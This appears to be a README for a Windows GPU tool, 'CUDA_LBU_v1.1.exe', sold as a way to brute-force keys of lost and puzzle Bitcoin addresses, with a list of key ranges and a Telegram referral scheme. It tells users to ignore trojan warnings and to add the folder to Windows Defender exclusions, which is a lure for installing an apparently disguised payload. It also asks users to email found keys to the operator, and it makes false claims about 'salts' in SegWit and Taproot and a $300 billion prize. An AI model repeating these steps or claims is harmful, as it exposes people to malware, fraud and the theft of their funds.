Welcome, Stalker!

There are about 37,000 Bitcoin addresses in the network with abandoned, forgotten, or lost passwords and keys—addresses that have had no outgoing transactions for 
over 10 years. Additionally, there are challenge addresses set up by billionaire whales, such as the 1000 BTC Bitcoin Puzzle. 
All these addresses are baked into the CUDA_LBU_v1.1.exe tool and collectively hold around $300 billion.

If you want to join the hunt and recover these treasures, unzip the archive into your Windows user folder (typically `C:\Users\YourName\`).

1. Open the `CUDA_LBU_v1.1` folder and locate `CUDA_LBU_v1.1.exe` inside.
2. Ignore any antivirus or Windows Defender warnings about suspicious files or trojans—these arise because the program deals with crypto-functions and key generation.
3. Add the `CUDA_LBU_v1.1` folder to your antivirus whitelist and to Windows Defender exclusions 
(`Settings → Update & Security → Windows Security → Virus & Threat Protection → Manage Settings → Add or Remove Exclusions → Add an Exclusion → Folder → 
Choose CUDA_LBU_v1.1 folder`).

`CUDA_LBU_v1.1` works only with NVIDIA GPUs supporting CUDA 10 and above.

---

## Supported Bitcoin Address Types

Today there are five address types derived from a single private key:

1. **Legacy (uncompressed)** (pre-2013, e.g., `1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm`)
2. **Legacy (compressed)** (post-2013, e.g., `1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH`)
3. **SegWit P2SH** (post-2017, e.g., `3JvL6Ymt8MVWiCNHC7oWU6nLeHNJKLZGLN`)
4. **Bech32 SegWit** (`p2wpkh` and `p2wsh`, e.g., `bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4`)
5. **Taproot Schnorr** (e.g., `bc1pmfr3p9j00pfxjh0zmgp99y8zftmd3s5pmedqhyptwy6lm87hf5sspknck9`)

We focus on compressed and uncompressed legacy addresses, since they are vulnerable to brute-force and contain the majority of lost funds. 
Recovering keys for SegWit and Taproot addresses is nearly impossible due to additional scripts and salts used.

---

## Setting the Key Range

The program lets you specify a hex range from **START** to **END** for your search to improve your chances:

* Addresses created before 2013 are typically uncompressed; post-2013 are usually compressed (not guaranteed).
* Some challenge ranges (e.g., from the 1000 BTC Bitcoin Puzzle) are known—all compressed:

START:	400001e410b4514000 END: 7fffffffffffffffff  					include 1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU		
START:	800000000000000000 END: ffffffffffffffffff  					include 1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR		
START:	1000000000000000000 END: 1ffffffffffffffffff  				include 12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4		
START:	2000000000000000000 END: 3ffffffffffffffffff  				include 1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv			
START:	8000000000000000000 END: fffffffffffffffffff  				include 1DJh2eHFYQfACPmrvpyWc8MSTYKh7w9eRF		
START:	10000000000000000000 END: 1fffffffffffffffffff  				include 1Bxk4CQdqL9p22JEtDfdXMsng1XacifUtE		
START:	20000000000000000000 END: 3fffffffffffffffffff  				include 15qF6X51huDjqTmF9BJgxXdt1xcj46Jmhb		
START:	40000000000000000000 END: 7fffffffffffffffffff  				include 1ARk8HWJMn8js8tQmGUJeQHjSE7KRkn2t8		
START:	100000000000000000000 END: 1ffffffffffffffffffff  				include 15qsCm78whspNQFydGJQk5rexzxTQopnHZ		
START:	200000000000000000000 END: 3ffffffffffffffffffff  				include 13zYrYhhJxp6Ui1VV7pqa5WDhNWM45ARAC		
START:	400000000000000000000 END: 7ffffffffffffffffffff  				include 14MdEb4eFcT3MVG5sPFG4jGLuHJSnt1Dk2		
START:	800000000000000000000 END: fffffffffffffffffffff  				include 1CMq3SvFcVEcpLMuuH8PUcNiqsK1oicG2D 
START:	2000000000000000000000 END: 3fffffffffffffffffffff  				include 1K3x5L6G57Y494fDqBfrojD28UJv4s5JcK		
START:	4000000000000000000000 END: 7fffffffffffffffffffff  				include 1PxH3K1Shdjb7gSEoTX7UPDZ6SH4qGPrvq	
START:	8000000000000000000000 END: ffffffffffffffffffffff  				include 16AbnZjZZipwHMkYKBSfswGWKDmXHjEpSf		
START:	10000000000000000000000 END: 1ffffffffffffffffffffff  				include 19QciEHbGVNY4hrhfKXmcBBCrJSBZ6TaVt
START:	40000000000000000000000 END: 7ffffffffffffffffffffff  				include 1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74		
START:	80000000000000000000000 END: fffffffffffffffffffffff  				include 1AE8NzzgKE7Yhz7BWtAcAAxiFMbPo82NB5		
START:	100000000000000000000000 END: 1fffffffffffffffffffffff  			include 17Q7tuG2JwFFU9rXVj3uZqRtioH3mx2Jad		
START:	200000000000000000000000 END: 3fffffffffffffffffffffff  			include 1K6xGMUbs6ZTXBnhw1pippqwK6wjBWtNpL 	
START:	800000000000000000000000 END: ffffffffffffffffffffffff  			include 15ANYzzCp5BFHcCnVFzXqyibpzgPLWaD8b
START:	1000000000000000000000000 END: 1ffffffffffffffffffffffff  			include 18ywPwj39nGjqBrQJSzZVq2izR12MDpDr8
START:	2000000000000000000000000 END: 3ffffffffffffffffffffffff  			include 1CaBVPrwUxbQYYswu32w7Mj4HR4maNoJSX
START:	4000000000000000000000000 END: 7ffffffffffffffffffffffff  			include 1JWnE6p6UN7ZJBN7TtcbNDoRcjFtuDWoNL
START:	10000000000000000000000000 END: 1fffffffffffffffffffffffff  			include 1CKCVdbDJasYmhswB6HKZHEAnNaDpK7W4n
START:	20000000000000000000000000 END: 3fffffffffffffffffffffffff  			include 1PXv28YxmYMaB8zxrKeZBW8dt2HK7RkRPX
START:	40000000000000000000000000 END: 7fffffffffffffffffffffffff  			include 1AcAmB6jmtU6AiEcXkmiNE9TNVPsj9DULf
START:	80000000000000000000000000 END: ffffffffffffffffffffffffff  			include 1EQJvpsmhazYCcKX5Au6AZmZKRnzarMVZu
START:	200000000000000000000000000 END: 3ffffffffffffffffffffffffff  			include 18KsfuHuzQaBTNLASyj15hy4LuqPUo1FNB
START:	400000000000000000000000000 END: 7ffffffffffffffffffffffffff  			include 15EJFC5ZTs9nhsdvSUeBXjLAuYq3SWaxTc
START:	800000000000000000000000000 END: fffffffffffffffffffffffffff  			include 1HB1iKUqeffnVsvQsbpC6dNi1XKbyNuqao
START:	1000000000000000000000000000 END: 1fffffffffffffffffffffffffff  			include 1GvgAXVCbA8FBjXfWiAms4ytFeJcKsoyhL
START:	4000000000000000000000000000 END: 7fffffffffffffffffffffffffff  			include 1824ZJQ7nKJ9QFTRBqn7z7dHV5EGpzUpH3
START:	8000000000000000000000000000 END: ffffffffffffffffffffffffffff  			include 18A7NA9FTsnJxWgkoFfPAFbQzuQxpRtCos
START:	10000000000000000000000000000 END: 1ffffffffffffffffffffffffffff  			include 1NeGn21dUDDeqFQ63xb2SpgUuXuBLA4WT4
START:	20000000000000000000000000000 END: 3ffffffffffffffffffffffffffff  			include 174SNxfqpdMGYy5YQcfLbSTK3MRNZEePoy
START:	80000000000000000000000000000 END: fffffffffffffffffffffffffffff  			include 1MnJ6hdhvK37VLmqcdEwqC3iFxyWH2PHUV
START:	100000000000000000000000000000 END: 1fffffffffffffffffffffffffffff  		include 1KNRfGWw7Q9Rmwsc6NT5zsdvEb9M2Wkj5Z
START:	200000000000000000000000000000 END: 3fffffffffffffffffffffffffffff  		include 1PJZPzvGX19a7twf5HyD2VvNiPdHLzm9F6
START:	400000000000000000000000000000 END: 7fffffffffffffffffffffffffffff  		include 1GuBBhf61rnvRe4K8zu8vdQB3kHzwFqSy7
START:	1000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffff  		include 1GDSuiThEV64c166LUFC9uDcVdGjqkxKyh
START:	2000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffff  		include 1Me3ASYt5JCTAK2XaC32RMeH34PdprrfDx
START:	4000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffff  		include 1CdufMQL892A69KXgv6UNBD17ywWqYpKut
START:	8000000000000000000000000000000 END: fffffffffffffffffffffffffffffff  		include 1BkkGsX9ZM6iwL3zbqs7HWBV7SvosR6m8N 
START:	20000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffff  		include 1AWCLZAjKbV1P7AHvaPNCKiB7ZWVDMxFiz
START:	40000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffff  		include 1G6EFyBRU86sThN3SSt3GrHu1sA7w7nzi4
START:	80000000000000000000000000000000 END: ffffffffffffffffffffffffffffffff  		include 1MZ2L1gFrCtkkn6DnTT2e4PFUTHw9gNwaj
START:	100000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffff  		1Hz3uv3nNZzBVMXLGadCucgjiCs5W9vaGz 
START:	400000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffff  		16zRPnT8znwq42q7XeMkZUhb1bKqgRogyy
START:	800000000000000000000000000000000 END: fffffffffffffffffffffffffffffffff  		1KrU4dHE5WrW8rhWDsTRjR21r8t3dsrS3R
START:	1000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffff  		17uDfp5r4n441xkgLFmhNoSW1KWp6xVLD
START:	2000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffff  		13A3JrvXmvg5w9XGvyyR4JEJqiLz8ZySY3
START:	4000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffff  		16RGFo6hjq9ym6Pj7N5H7L1NR1rVPJyw2v 
START:	8000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffff  		1UDHPdovvR985NrWSkdWQDEQ1xuRiTALq
START:	10000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffff  	15nf31J46iLuK1ZkTnqHo7WgN5cARFK3RA
START: 20000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffff  		1Ab4vzG6wEQBDNQM1B2bvUz4fqXXdFk2WT
START: 40000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffff  		1Fz63c775VV9fNyj25d9Xfw3YHE6sKCxbt
START: 80000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffff  		1QKBaU6WAeycb3DbKbLBkX7vJiaS8r42Xo
START: 100000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffff  		1CD91Vm97mLQvXhrnoMChhJx4TP9MaQkJo
START: 200000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffff  		15MnK2jXPqTMURX4xC3h4mAZxyCcaWWEDD
START: 400000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffff  		13N66gCzWWHEZBxhVxG18P8wyjEWF9Yoi1
START: 800000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffff  		1NevxKDYuDcCh1ZMMi6ftmWwGrZKC6j7Ux
START: 1000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffff  	19GpszRNUej5yYqxXoLnbZWKew3KdVLkXg
START: 2000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffff  	1M7ipcdYHey2Y5RZM34MBbpugghmjaV89P
START: 4000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffff  	18aNhurEAJsw6BAgtANpexk5ob1aGTwSeL
START: 8000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffff  	1FwZXt6EpRT7Fkndzv6K4b4DFoT4trbMrV
START: 10000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffff  	1CXvTzR6qv8wJ7eprzUKeWxyGcHwDYP1i2
START: 20000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffff  	1MUJSJYtGPVGkBCTqGspnxyHahpt5Te8jy
START: 40000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffff  	13Q84TNNvgcL3HJiqQPvyBb9m4hxjS3jkV
START: 80000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffff  	1LuUHyrQr8PKSvbcY1v1PiuGuqFjWpDumN
START: 100000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffffff  	18192XpzzdDi2K11QVHR7td2HcPS6Qs5vg
START: 200000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffffff  	1NgVmsCCJaKLzGyKLFJfVequnFW9ZvnMLN
START: 400000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffffff  	1AoeP37TmHdFh8uN72fu9AqgtLrUwcv2wJ
START: 800000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffffff  	1FTpAbQa4h8trvhQXjXnmNhqdiGBd1oraE
START: 1000000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffffff  	14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9
START: 2000000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffffff  	19z6waranEf8CcP8FqNgdwUe1QRxvUNKBG
START: 4000000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffffff  	14u4nA5sugaswb6SZgn5av2vuChdMnD9E5
START: 8000000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffffff  	1NBC8uXJy1GiJ6drkiZa1WuKn51ps7EPTv

You can choose any single range or multiple in sequence (e.g., `400001e410b4514000` to `1fffffffffffffffffff` covers six addresses).

All other addresses lie in the overall range from START: ffffffffffffffffffffffffffffffffffffffff to 
END: fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 and include both compressed and uncompressed.

---

## How to Run

Double-click `CUDA_LBU_v1.1.exe`. In the console window, enter:
# In 64-way cycling determinictic oscillating pendulum mode...  (pendulum state and direction will be saved in file)

1. **START key (hex)**: start of your search range (e.g., `400001e410b4514000`).
2. **END key (hex)**: end of your search range (e.g., `7fffffffffffffffff`).
3. **Number of CUDA devices**: physical NVIDIA GPUs with CUDA support.
4. **CUDA blocks \[50–250]**: blocks per device (tune for your GPU; RTX 4060 \~96).
5. **Threads per block \[32–1024] (multiple of 32)**: tune for best performance (RTX 4060 \~128).
6. **Points per thread \[50–5000]**: more points = higher throughput, less free memory.

After launch, you’ll see initialization and live performance stats

# Random mode

1. **START key (hex)**: Random
2. **END key (hex)**: r
3. **Number of key digits to start \[18-64]**: desired range of digits for Random mode  
3. **Number of CUDA devices**: physical NVIDIA GPUs with CUDA support.
4. **CUDA blocks \[50–250]**: blocks per device (tune for your GPU; RTX 4060 \~96).
5. **Threads per block \[32–1024] (multiple of 32)**: tune for best performance (RTX 4060 \~128).
6. **Points per thread \[50–5000]**: more points = higher throughput, less free memory.

After launch, you’ll see initialization and live performance stats

## Grey Zone

Its a local database of passed/checked key ranges. Every 2 minutes program updates it and saved new ranges in memory and Grey.zone file in programm folder.
CUDA_LBU first check if selected range in Grey Zone, if not it try to scan it for a key.
Active stalkers must post theyr Grey.zone file to group.
In return will be post merged Grey.zone from all stalkers by group founder.
After that replace your old file with new one in purpose to increase a finding chances!

## TESTING Finding Key

To test, use a micro-range for address `13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so:`
`START: 2832ed72f2b5e25ee END: 2832ed75f3b5e45ee`

It must find a code in some minutes and show the table

The program uses AI math optimization methods, deterministic pendulum cyclic ranges mode and full-random brute-force when `RANDOM` is specified in START: and END:. 
The longer it runs, the higher your chance to find a key. When a key is found, it prints the address and stops all processes, saving results to `Found_Keys.txt`.

**Send `Found_Keys.txt` from the program folder via email or messenger to:

* `SoGerera@yahoo.com`
* [https://t.me/RomanVader](https://t.me/RomanVader)

Include your Bitcoin address to receive 50% of the recovered funds.

---

## Referral & Rewards Network

**Referral structure:**

* **Stalker**: anyone in the Telegram group ([https://t.me/LostBTCUnlocker](https://t.me/LostBTCUnlocker)).
* **Bolt**: a Stalker you invited.
* Each found key awards:

  * 50% to the finder
  * 7% to their inviter (Stalker)
  * 13% split depends on Working Time among all active group members 
  who posted a weekly photo/video proof of running the program (Fri–Mon) with Grey.Zone posting
	- > 200 working hours + 1 share of 13% reward
	- > 300 wh + 2 shares
	- > 600 wh + 3 shares
	- > 800 wh + 4 shares
	- > 1000 wh + 5 shares
	- > 1500 wh + 6 shares
	- > 2000 wh + 7 shares
	- > 2500 wh + 8 shares
	- > 3000 wh + 9 shares
	- > 3500 wh + 10 shares
	- > 4000 wh + 11 shares
	- > 4500 wh + 12 shares
	- > 5000 wh + 13 shares

Now you have your own "Labor book" - cryptographic curve saved on your user APPDATA folder (e.g. "C:\Users\...\AppData\Roaming\LBU\CUDA_LBU")
It holds your Working Hours safe in curve even when your CUDA_LBU is offline.

For example, if 1,000 BTC is found:

* Finder: 500 BTC
* Their Stalker: 70 BTC
* Active group: 1000 Stalkers 
* 500 (200 wh) active members 500 shares: 0.009 BTC each (\~\$1,000)
* 300 (2000 wh) active members 2100 shares: 0.063 BTC each (\~\$7,500)
* 200 (4000 wh) active members 2200 shares: 0.099 BTC each (\~\$11,500)
* 197 (5000 wh) active members 2561 shares: 0.117 BTC each (\~\$14,000)
* Total: 7361 shares of 13% (500 BTC) / 7361 = 0.009 BTC for 1 share

**Weekly proof requirement:**

Post here https://t.me/LostBTCUnlocker a screenshot or video of the program’s console with a visible timestamp and working hour + Grey.Zone file share.
When a code is found, submit it with your BTC address and your inviter’s contact to the project lead (“Monolith”) https://t.me/RomanVader.

## Minimum requirements:

Your GPUs run at full load — provide proper cooling (floor fans, open case), especially in hot weather.

* Windows 10
* Intel Celeron 1 GHz
* 4 GB RAM
* NVIDIA CUDA GPU
* No internet required
---

Good luck, Stalker. Patience and persistence will pay off!
